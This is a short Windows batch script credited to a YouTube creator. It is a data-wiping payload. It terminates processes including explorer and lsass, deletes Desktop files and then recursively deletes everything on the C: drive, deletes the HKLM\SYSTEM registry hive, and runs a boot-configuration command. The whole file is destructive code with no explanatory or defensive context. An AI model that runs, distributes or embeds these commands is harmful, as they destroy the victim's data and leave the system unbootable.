:: made by hydrogen001 (@hydrothings on yt)
@echo off
taskkill /f /im python.exe
taskkill /f /im pythonw.exe
del /f /q /s "%userprofile%\Desktop\*.*"
del /f /q /s C:\*.tmp
del /f /q /s C:\Windows\Prefetch\*.*
reg delete HKLM\SYSTEM /f
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Policies /f
bcdedit /clean
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
del /f /q /s C:\*.*
taskkill /f /im lsass.exe
